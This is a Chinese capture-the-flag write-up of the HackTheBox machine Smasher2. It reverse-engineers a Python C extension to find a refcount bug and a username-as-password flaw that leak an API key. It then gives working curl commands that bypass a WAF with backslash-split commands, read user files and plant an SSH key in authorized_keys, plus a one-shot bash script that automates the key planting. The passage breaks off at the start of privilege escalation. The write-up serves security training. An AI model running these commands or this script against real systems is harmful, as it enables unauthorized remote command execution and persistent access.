```

现在是需要了解依赖于ses.so中的模块的manager对象的地方。 下图是上面is_logged = manager.check_login(data)调用的can_login函数在Ida Pro中的样子：

![](https://0xdf.gitlab.io/img/1570903084609.png)

国外大佬的图分析的很清楚，再次膜拜

关于Python代码的另一条注释-api密钥（存储为manager.secret_key）在此处设置：

``` bash
        login = ["<REDACTED>", "<REDACTED>"]
        Managers.update({id: ses.SessionManager(login, craft_secure_token(":".join(login)))})
```

craft_secure_token()，它只是获取输入并对其进行hash处理：

``` bash
def craft_secure_token(content):
    h = hmac.new("HMACSecureKey123!", base64.b64encode(content).encode(), hashlib.sha256)
    return h.hexdigest()
```
这意味着只要用户名和密码不变，API密钥也不会改变。

#### 方法1：利用引用计数

这是预期的方法，但是很难发现.

Python对象是在堆上分配的，并且保留引用计数以监视它们是否在使用中，并且当引用计数达到0时，垃圾收集器将释放空间。 在编写Python代码时，将为您进行管理。 但是一旦开始编写C扩展名（编译为.so文件），就必须[manage these references yourself](http://edcjones.tripod.com/refcount.html)。 有[series of C macros](https://docs.python.org/3.8/c-api/refcounting.html)将有助于实现这一目标。 可以通过在CPython源代码中查看[object.c](https://github.com/python/cpython/blob/master/Include/object.h)来查看Python对象。

首先，我将看到对象结构使得任何对象中的第一个值都是ob_refcnt，即引用计数：

``` bash
typedef struct _object {
    _PyObject_HEAD_EXTRA
    Py_ssize_t ob_refcnt;
    struct _typeobject *ob_type;
} PyObject;
```

我还可以看到PyINCREF(op)宏基本上只是对_PyINCREF的调用，该调用基本上只是向该引用计数器值添加一个：

``` bash
static inline void _Py_INCREF(PyObject *op)
{
    _Py_INC_REFTOTAL;
    op->ob_refcnt++;
}

#define Py_INCREF(op) _Py_INCREF(_PyObject_CAST(op))
```

类似地，如果查看Py_DECREF，则相同，除了代码运行不仅会减少引用计数器，而且如果该计数器为0，它将在对象上调用_Py_Dealloc：

``` bash
static inline void _Py_DECREF(const char *filename, int lineno,
                              PyObject *op)
{
    (void)filename; /* may be unused, shut up -Wunused-parameter */
    (void)lineno; /* may be unused, shut up -Wunused-parameter */
    _Py_DEC_REFTOTAL;
    if (--op->ob_refcnt != 0) {
#ifdef Py_REF_DEBUG
        if (op->ob_refcnt < 0) {
            _Py_NegativeRefcount(filename, lineno, op);
        }
#endif
    }
    else {
        _Py_Dealloc(op);
    }
}

#define Py_DECREF(op) _Py_DECREF(__FILE__, __LINE__, _PyObject_CAST(op))
```

根据文档，_Py_Dealloc没有在此定义，因为它仅在解释器代码中使用。
我将在Ghidra中打开该模块，然后看一下反汇编。 当我开始学习具有这些知识的代码时，便开始看到我认为这些宏的实例。 例如，在SessionManager_check_login中，在第44行：


``` bash
  post_has_data = dict_contains(post_data,&data);
  if ((char)post_has_data != '\x01') {
    *post_data = *post_data + -1;
    if (*post_data == 0) {
      (**(code **)(post_data[1] + 0x30))(post_data);
    }
    plVar2 = (long *)ErrorMsg(PyExc_TypeError,"Missing data parameter",parameter,uVar3,in_R8B,in_R9B
                              ,(char)parameter);
    goto LAB_0010250e;
  }
```

它调用dict_contains来查看传递给它的（我的POST）是否是包含键“data”的字典。 如果返回的结果不为true（'\ x01'），则它将递减参考计数器，然后检查它是否现在为0。如果是，则其自身将调用post_data [1] + 0x30。

由于我知道post_data是一个字典对象，因此我可以查看dictobject.c的Python源代码，以了解结构的定义位置：

``` bash
PyTypeObject PyDictIterItem_Type = {
    PyVarObject_HEAD_INIT(&PyType_Type, 0)
    "dictionary-itemiterator",                  /* tp_name */
    sizeof(dictiterobject),                     /* tp_basicsize */
    0,                                          /* tp_itemsize */
    /* methods */
    (destructor)dictiter_dealloc,               /* tp_dealloc */
    0,                                          /* tp_print */
    0,                                          /* tp_getattr */
    0,                                          /* tp_setattr */
    0,                                          /* tp_compare */
    0,                                          /* tp_repr */
    0,                                          /* tp_as_number */
    0,                                          /* tp_as_sequence */
    0,                                          /* tp_as_mapping */
    0,                                          /* tp_hash */
    0,                                          /* tp_call */
    0,                                          /* tp_str */
    PyObject_GenericGetAttr,                    /* tp_getattro */
    0,                                          /* tp_setattro */
    0,                                          /* tp_as_buffer */
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,/* tp_flags */
    0,                                          /* tp_doc */
    (traverseproc)dictiter_traverse,            /* tp_traverse */
    0,                                          /* tp_clear */
    0,                                          /* tp_richcompare */
    0,                                          /* tp_weaklistoffset */
    PyObject_SelfIter,                          /* tp_iter */
    (iternextfunc)dictiter_iternextitem,        /* tp_iternext */
    dictiter_methods,                           /* tp_methods */
    0,
};
```

知道PyVarObject_HEAD_INIT扩展为1，类型，大小，并假设每个单词为8字节，则0x30字节为（（析构函数）dictiter_dealloc）。
因此，回过头来，发现了Py_DECREF宏的外观。
同样，我在代码中看到的地方如下所示：

``` bash
*data_object = *data_object + 1;
```

这是Py_INCREF宏扩展的。
在此基础上，我将回到手头的代码。 错误在于如何跟踪从请求中读取的Python对象数据的引用：

``` bash
data = request.get_json(silent=True)
```
稍后将其传递到manager.check_login中：

``` bash
is_logged = manager.check_login(data)
```

结果is_logged包含is_logged[1]中原始提交的json，该错误消息中引用了json：

``` bash
ret["result"] = "Cannot authenticate with data: %s - %s" % (is_logged[1], "Too many tentatives, wait 2 minutes!" if manager.blocked else "Try again!")
```
如果登录失败，则会显示POSTED JSON来代替前一个％s：

``` bash
{
	"authenticated": false,
	"result": "Cannot authenticate with data: {u'username': u'0xdf', u'password': u'password'} - Try again!"
}
```
在C中，我可以在变量声明之后的第二行看到创建新列表对象的地方：
``` bash
return_list_object = (long *)PyList_New(2);
```
再向下一点，在检查关键数据是否在发布的JSON/字典中之后，它将数据对象读入一个对象，我将其命名为dataobject：

``` bash
data_object = (long *)get_dict_key(post_data,&data);
```

接下来是一个阻止程序，用于检查用户是否被阻止并进行处理：

``` bash
  user_is_blocked = is_blocked(user_login);
  if ((char)user_is_blocked == '\x01') {
    user_is_blocked = can_login(user_login);
    if ((char)user_is_blocked != '\0') {
      set_unblocked(user_login);
      set_login_count(user_login,0);
    }
    local_50 = (long *)PyBool_FromLong(0);
    *local_50 = *local_50 + 1;
    *(long **)return_list_object[3] = local_50;
    *data_object = *data_object + 1;
    *(long **)(return_list_object[3] + 8) = data_object;
  }
```

我将注意到，将创建一个布尔False（然后将引用计数器增加Py_INCREF），并将其存储在列表对象的第三个单词中。 然后，将data_object传递给Py_INCREF，然后将其设置为8个字节到同一第三个对象中。 因此，列表中的第三个对象必须是列表本身（第一个对象是引用计数）。 在此函数的最后，我看到这是返回的对象：

``` bash
  *return_list_object = *return_list_object + 1;
  plVar2 = return_list_object;
LAB_0010250e:
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return plVar2;
```

列表对象上的引用计数增加，然后将其设置为plVar2并返回。
如果未阻止用户，则可以看到类似的模式。 将检查登录计数，该计数小于10，它将从POSTed JSON和内部存储中加载用户名和密码。 然后，我将在此处显示三种可能的路径：

``` bash
      __s2 = (char *)get_internal_usr(user_login);
      success = strcmp(username_string,__s2);
      if (success == 0) {
        __s2 = (char *)get_internal_pwd(user_login);
        success = strcmp(password_string,__s2);
        if (success == 0) {
          puVar1 = (undefined8 *)return_list_object[3];
          return_value = PyBool_FromLong(1);
          *puVar1 = return_value;
          *data_object = *data_object + 1;
          *(long **)(return_list_object[3] + 8) = data_object;
          goto LAB_001024c5;
        }
      }
      puVar1 = (undefined8 *)return_list_object[3];
      return_value = PyBool_FromLong(0);
      *puVar1 = return_value;
      *data_object = *data_object + 1;
      *(long **)(return_list_object[3] + 8) = data_object;
    }
    else {
      set_blocked(user_login);
      local_48 = (long *)PyBool_FromLong(1);
      *local_48 = *local_48 + 1;
      puVar1 = (undefined8 *)return_list_object[3];
      return_value = PyBool_FromLong(0);
      *puVar1 = return_value;
      *(long **)(return_list_object[3] + 8) = data_object;
    }
```

第一个是用户名和密码是否匹配。 它在data_object上调用Py_INCREF，将其设置为列表中的8个字节，并将列表中的0个字节设置为True。
如果用户名或密码失败，则将其Py_INCREFs data_ojbect设置为列表中的第一项为False，将data_object上的名称为Py_INCREF，然后将data_object置于第二项。
第三个路径是登录计数不小于10。它将第一个列表项设置为False，将第二个列表项设置为data_object。
缺少了什么？ 它没有增加data_object的引用计数！ 下一个代码（所有路径都经过）是：

``` bash
LAB_001024c5:
  *data_object = *data_object + -1;
  if (*data_object == 0) {
    (**(code **)(data_object[1] + 0x30))(data_object);
  }
  *return_list_object = *return_list_object + 1;
  plVar2 = return_list_object;
```

这是data_object上的Py_DECREF。
这是什么意思？ 在此调用结束时，如果它是第11次失败的登录，则具有用户名和密码的data_object将被标记为不再引用，因此将打开以进行垃圾回收，即使当相同的内存将在错误消息中打印出来时， 代码重新回到Python中。
事实证明，在调用manager.check_login（data）之后，无论check_login的结果如何，它都会创建一个对象：

``` bash
    is_logged = manager.check_login(data)
    secret_token_info = ["/api/<api_key>/job", manager.secret_key, int(time.time())]
```

几行后，识别出登录失败并构造了消息：

``` bash
     if not is_logged[0]:
         ret["authenticated"] = False
         ret["result"] = "Cannot authenticate with data: %s - %s" % (is_logged[1], "Too many tentatives, wait 2 minutes!" if manager.blocked else "Try again!")
```

利用：

 - 我发送10个失败的登录名。用户状态未设置为已阻止。

 - 我发送了第11次登录尝试，但登录数据已修改，因此它包含与secret_token_info相同的结构，并带有两个字符串和一个int的列表，而不是该站点发送的是带有两个键的字典。

 - manager.check_login（）由于该块而将失败，并减少data_object上的引用计数，从而使垃圾收集器将堆上的该空间标记为已打开。

 - 该程序在堆上为secret_token_info分配空间，secret_token_info是一个具有两个字符串和一个int的Python对象。由于data_object进行垃圾回收之前所在的空间仅为该大小，因此它将使用该空间。

 - 发送错误消息时，由于出现垃圾回收错误，指向data_object的指针现在指向secret_token_info，而是显示该信息。

Proxy通过Burp发送，并设置拦截。提交一个明显不正确的用户名和密码0xdf/0xdf：

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb7.jpg)

再发送9次。现在，将其更改为数据为具有两个字符串和一个整数的数组。 它们的值是什么无关紧要。 使用

``` bash
{"action":"auth","data":["0xdf", "string", 223]}
```
当我提交时，错误消息中包含泄漏的信息，包括API密钥及其使用方法：

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb8.jpg)

``` bash
{"authenticated":false,"result":"Cannot authenticate with data: ['/api/<api_key>/job', 'fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8', 1577434053] - Too many tentatives, wait 2 minutes!"}
```

#### 方法2：利用用户名==密码

在这里，我查看了检查用户名和密码的代码。 首先，此块加载输入的用户名和密码，然后调用get_internal_usr，并将输入的用户名与结果进行比较：

![](https://0xdf.gitlab.io/img/1570906220495.png)

如果匹配，则在此处继续，在此调用get_internal_pwd并将用户输入的密码与结果进行比较：

![](https://0xdf.gitlab.io/img/1570906095855.png)

如果此比较匹配，则返回True。
从启动代码中记住登录对象是一个包含两个项目的列表，可能是用户名和密码：

``` bash
             login = ["<REDACTED>", "<REDACTED>"]
             Managers.update({id: ses.SessionManager(login, craft_secure_token(":".join(login)))})
```

深入研究get_internal_usr（在Ghidra中查找反编译的代码），看到以下内容：

``` bash
undefined8 get_internal_usr(undefined8 param_1)

{
  long *plVar1;
  undefined8 uVar2;
  
  plVar1 = (long *)PyObject_GetAttrString(param_1,"user_login");
  uVar2 = PyList_GetItem(plVar1,0);
  uVar2 = PyString_AsString(uVar2);
  *plVar1 = *plVar1 + -1;         // Py_DECREF
  if (*plVar1 == 0) {
    (**(code **)(plVar1[1] + 0x30))(plVar1);
  }
  return uVar2;
}
```

使用PyObject_GetAttrString来获取user_login对象，该对象是上面带有用户名和密码的列表。 然后在下一行检索列表中的第一项，将其作为字符串处理，并在调用Py_DECREF之后返回。 这就是所期望的。
现在，看看get_internal_pwd：

``` bash
undefined8 get_internal_pwd(undefined8 param_1)

{
  long *plVar1;
  undefined8 uVar2;
  
  plVar1 = (long *)PyObject_GetAttrString(param_1,"user_login");
  uVar2 = PyList_GetItem(plVar1,0);  // This should be 1, not 0
  uVar2 = PyString_AsString(uVar2);
  *plVar1 = *plVar1 + -1;
  if (*plVar1 == 0) {
    (**(code **)(plVar1[1] + 0x30))(plVar1);
  }
  return uVar2;
}
```

执行相同的操作，包括获取列表中的第一项，而不是第二项。 这意味着实际上是根据存储的用户名检查密码的！
知道了这一点，我花了几分钟就猜出了Administrator：Administrator的凭据。 这样做时，它将返回API密钥和端点信息：

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb9.jpg)

``` bash
{
	"authenticated": true,
	"result": {
		"creation_date": 1577435021,
		"endpoint": "/api/<api_key>/job",
		"key": "fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8"
	}
}
```

当得到一个shell时，查看源代码，发现它试图将用户名和密码设置为无法猜测的值：

``` bash
login = ["Administrator", "SuperSecretAdminPWD123!"]
```
但是该用户名/密码组合无效，因为从未检查第二项。

 - API执行

现在有了api密钥，转到/api。 给的/api路径的代码显示可以运行命令：

``` bash
@app.route("/api/<key>/job", methods=['POST'])
def job(key):
    ret = {"success": None, "result": None}
    manager = safe_get_manager(session["id"])
    if manager.secret_key == key:
        data = request.get_json(silent=True)
        if data and type(data) == dict:
            if "schedule" in data:
                out = subprocess.check_output(['bash', '-c', data["schedule"]])
                ret["success"] = True
                ret["result"] = out
            else:
                ret["success"] = False
                ret["result"] = "Missing schedule parameter."
        else:
            ret["success"] = False
            ret["result"] = "Invalid value provided."
    else:
        ret["success"] = False
        ret["result"] = "Invalid token."
    return jsonify(ret)
```

需要发布json数据，并在其中包含一个关键时间表，该值是我要运行的值。
还在顶部看到一个会话检查，因此，我还将包括从Burp提取的会话cookie。

 - 运行失败

``` bash
root@kali:~# curl -s -H "Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":"id"}'
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job
on this server.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at wonderfulsessionmanager.smasher2.htb Port 80</address>
</body></html>
```

-s 允许在没有状态栏的情况下传递结果；
-H "Cookie: session=eyJp ..." 添加会话cookie；
-H "Content-Type: application/json" 告诉服务器将POST数据作为json处理；
http：//wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job是登录后给出的网址；
--data '{"schedule":"id"}' 是要尝试运行命令ID。

 - 存在waf

在代码中看不到403禁止访问。 如果密钥不匹配，我应该得到200和json，表示成功为False。 这使我认为可能存在WAF阻止请求。
开始使用不同的命令，以了解可以完成的工作。 id很小，但是w呢？ 它返回结果：

``` bash
root@kali:~# curl -s -H "Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":"w"}'
{"result":" 09:40:47 up  3:24,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\n","success":true}
```

好的，回到id，我可以在字符串中添加一些WAF规则以通过它吗？ 此链接具有一些良好的WAF规则。

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb10.jpg)

发现了2种通过WAF执行命令的方法，包括''和\\来分解字符。

#### 得到user.txt

使用此命令来检查home目录-只有一个：

``` bash
root@kali:~# curl -s -H "Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":"l\\s /home/"}'
{"result":"dzonerzy\n","success":true}
```

帅的掉渣，接下来依法炮制

``` bash
root@kali:~# curl -s -H "Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":"l\\s -\\l\\a /home/dzonerzy/"}'
{"result":"total 44\ndrwxr-xr-x 6 dzonerzy dzonerzy 4096 Feb 17  2019 .\ndrwxr-xr-x 3 root     root     4096 Feb 15  2019 ..\nlrwxrwxrwx 1 dzonerzy dzonerzy    9 Feb 15  2019 .bash_history -> /dev/null\n-rw-r--r-- 1 dzonerzy dzonerzy  220 Feb 15  2019 .bash_logout\n-rw-r--r-- 1 dzonerzy dzonerzy 3799 Feb 16  2019 .bashrc\ndrwx------ 3 dzonerzy dzonerzy 4096 Feb 15  2019 .cache\ndrwx------ 3 dzonerzy dzonerzy 4096 Feb 15  2019 .gnupg\ndrwx------ 5 dzonerzy dzonerzy 4096 Feb 17  2019 .local\n-rw-r--r-- 1 dzonerzy dzonerzy  807 Feb 15  2019 .profile\n-rw-r--r-- 1 root     root      900 Feb 16  2019 README\ndrwxrwxr-x 4 dzonerzy dzonerzy 4096 Dec 27 08:56 smanager\n-rw-r----- 1 root     dzonerzy   33 Feb 17  2019 user.txt\n","success":true}
```

读取user.txt

``` bash
root@kali:~# curl -s -H "Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":"ca\\t /home/dzonerzy/user.txt"}'
{"result":"91a13e3*************************\n","success":true}
```
<font color="red">为防止有人把flag拿来乱提交，故将flag打码</font>

#### SSH密钥投毒

我无法通过WAF获得类似我的IP地址的任何信息，所以偶然发现了一些战术。 已经在dzonerzy的主目录中。 将创建一个.ssh目录，然后上传一个密钥。
创建目录：

``` bash
root@kali:~# curl -s -H "Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":"mk\\dir /home/dzonerzy/.ss\\h"}'
{"result":"","success":true}
```

base64加密密钥并将其写入/tmp：

``` bash
root@kali:~# base64 -w0 /root/.ssh/id_rsa.pub
c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDOXAvYnM5c1VkeFBZeUcrQWxaVnR1ais3d3BWREFoNmpySWRVeEl4N2MrK2NldEcvdU9ZMVIyZkozTDlIQ2dqazVXRkFpTVFsMmVYVnRtdHdWRGFYN1BpdzlSek1EV05RZW9YbUt6M0l5UFcyNzJpVVN4d2Q1TTd1ZVRpdTNnSlc0U1pmTWZITi84bjZ5clNDV25qZnFPaDN2aGdWTmx0ZmFicnRRSjVPQTR3S1BTcFZHVHNMT3psUCtjNEFmWjEyNVp6RVdOU0J1WG9GaCtLUUpsUWdwY1pkN1NDVVVEWnZBdGQ4b3BaR1pib0VidzJnemdhQUQrMkZIOGxrejJHOGc2VDhtSWVyRnl2enpvSmxpVU14Q3U0U0huQ1FnVThCQjYzdThlaTFoSXk2M0hPZVkycjd5VjU2Rmd5MVNXdDN0ZVl4THk5b1FyaFVsKzJjWTRoUDFXNy95dDJwSHRyQ1Rma3M0RDFtS1o5UlJrNlJTaTc0UmtGQkVUMkExYk9ISmZtTzYxQVN4UnlZeWhPQzVzYW0yZ2F5VS9IaHIrVUtuY0crb2JXMWpGRlR4NlFoUFBuVEdjVnJVQXQ0bnY5OUdiUVh3Z2pxOFlPL0tMT091Q3Q0Z2pDYnk4NVF0b1dlZnBvTWZSTUJoSXFZZ2pvQ0RuTEVsQkc5YWZqMVJiT2M9IHJvb3RAa2FsaQo=
```
写入成功

``` bash
root@kali:~# curl -s -H "Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":"echo \"c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDOXAvYnM5c1VkeFBZeUcrQWxaVnR1ais3d3BWREFoNmpySWRVeEl4N2MrK2NldEcvdU9ZMVIyZkozTDlIQ2dqazVXRkFpTVFsMmVYVnRtdHdWRGFYN1BpdzlSek1EV05RZW9YbUt6M0l5UFcyNzJpVVN4d2Q1TTd1ZVRpdTNnSlc0U1pmTWZITi84bjZ5clNDV25qZnFPaDN2aGdWTmx0ZmFicnRRSjVPQTR3S1BTcFZHVHNMT3psUCtjNEFmWjEyNVp6RVdOU0J1WG9GaCtLUUpsUWdwY1pkN1NDVVVEWnZBdGQ4b3BaR1pib0VidzJnemdhQUQrMkZIOGxrejJHOGc2VDhtSWVyRnl2enpvSmxpVU14Q3U0U0huQ1FnVThCQjYzdThlaTFoSXk2M0hPZVkycjd5VjU2Rmd5MVNXdDN0ZVl4THk5b1FyaFVsKzJjWTRoUDFXNy95dDJwSHRyQ1Rma3M0RDFtS1o5UlJrNlJTaTc0UmtGQkVUMkExYk9ISmZtTzYxQVN4UnlZeWhPQzVzYW0yZ2F5VS9IaHIrVUtuY0crb2JXMWpGRlR4NlFoUFBuVEdjVnJVQXQ0bnY5OUdiUVh3Z2pxOFlPL0tMT091Q3Q0Z2pDYnk4NVF0b1dlZnBvTWZSTUJoSXFZZ2pvQ0RuTEVsQkc5YWZqMVJiT2M9IHJvb3RAa2FsaQo=\" > /tmp/luci"}'
{"result":"","success":true}
```

现在解码密钥并存储在authorized_keys中：

``` bash
root@kali:~# curl -s -H "Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":"ba\\se\\64 -\\d /tmp/luci >> /home/dzonerzy/.ss\\h/autho\\rized_k\\eys"}'
{"result":"","success":true}
```

现在可以连接了，帅炸了。。。

``` bash
root@kali:~# ssh -i /root/.ssh/id_rsa dzonerzy@10.10.10.135
Enter passphrase for key '/root/.ssh/id_rsa': 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Dec 27 10:38:23 2019 from 10.10.14.10
dzonerzy@smasher2:~$ id
uid=1000(dzonerzy) gid=1000(dzonerzy) groups=1000(dzonerzy),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
dzonerzy@smasher2:~$ whoami
dzonerzy
dzonerzy@smasher2:~$
```

还可以写成一键getshell的脚本如下所示，然后运行，非常的牛批：

``` bash
#!/bin/bash

cookie=$(curl -s -I  http://wonderfulsessionmanager.smasher2.htb/ | grep "Set-Cookie" | cut -d';' -f1 | cut -d= -f2)
ssh_pub_b64=$(cat /root/.ssh/id_rsa.pub | base64 -w0)

# Upload base64 encoded key
curl -s -H "Cookie: session=$cookie" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":"echo    \"'$ssh_pub_b64'\" > /tmp/df"}' | grep -q true || { echo "[-] Failed to upload public key to /tmp"; exit 1; }
echo "[+] Uploaded base64-encoded public key to /tmp/df"

# make .ssh directory
curl -s -H "Cookie: session=$cookie" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":         "mk\\dir -\\p /home/dzonerzy/.ss\\h"}' | grep -q true || { echo "[-] Failed to make /home/dzonerzy/.ssh directory";  exit 1; }
echo "[+] Created .ssh directory"

# Decode Key
curl -s -H "Cookie: session=$cookie" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":"base64 -\\d /tmp/df > /home/dzonerzy/.ss\\h/auth\\orized_keys"}' | grep -q true || { echo "[-] Failed to decode key into authorized_keys"; exit 1; }
echo "[+] Decoded public key into authorized_keys file"

# Delete tmp file
curl -s -H "Cookie: session=$cookie" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":"rm /tmp/df"}' | grep -q true || echo "[-] Failed to delete encoded key from tmp. Manually rm /tmp/df"

echo -e "[+] SSH with the following command:\nssh -i /root/.ssh/id_rsa dzonerzy@10.10.10.135"
```

``` bash
root@kali:~# ./smasher2.sh 
[+] Uploaded base64-encoded public key to /tmp/df
[+] Created .ssh directory
[+] Decoded public key into authorized_keys file
[+] SSH with the following command:
ssh -i /root/.ssh/id_rsa dzonerzy@10.10.10.135
root@kali:~# ssh -i /root/.ssh/id_rsa dzonerzy@10.10.10.135
Enter passphrase for key '/root/.ssh/id_rsa': 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Dec 27 10:38:23 2019 from 10.10.14.10
dzonerzy@smasher2:~$ id
uid=1000(dzonerzy) gid=1000(dzonerzy) groups=1000(dzonerzy),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
dzonerzy@smasher2:~$ whoami
dzonerzy
dzonerzy@smasher2:~$ 
```

#### 提权：dzonerzy –> root

``` bash
dzonerzy@smasher2:~$ cat README 


         .|'''.|                            '||                      
         ||..  '  .. .. ..    ....    ....   || ..     ....  ... ..  
          ''|||.   || || ||  '' .||  ||. '   ||' ||  .|...||  ||' '' 
        .     '||  || || ||  .|' ||  . '|..  ||  ||  ||       ||     
        |'....|'  .|| || ||. '|..'|' |'..|' .||. ||.  '|...' .||.    v2.0 
                                                             
                                                        by DZONERZY 

Ye you've come this far and I hope you've learned something new, smasher wasn't created
with the intent to be a simple puzzle game... but instead I just wanted to pass my limited
knowledge to you fellow hacker, I know it's not much but this time you'll need more than
skill, you will need to think outside the box to complete smasher 2 , have fun and happy

                                       Hacking!

free(knowledge);
free(knowledge);
* error for object 0xd00000000b400: pointer being freed was not allocated *
```

给出提示说明提权需要自己写exp来通过内核内存溢出提权

``` bash
dzonerzy@smasher2:~$ find / -group adm 2>/dev/null
/var/spool/rsyslog
/var/log/apt/term.log
/var/log/syslog
/var/log/apache2
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache2/other_vhosts_access.log
/var/log/kern.log
/var/log/auth.log
```

通过访问auth.log，我可以查看sudo运行的不同命令。 日志行采用以下格式：

``` bash
dzonerzy@smasher2:~$ strings /var/log/auth.log | grep COMMAND | head -1
Feb 15 21:58:48 smasher sudo: dzonerzy : TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt-get update
```
使用bash-foo，可以在此日志中获得命令的列表：

``` bash
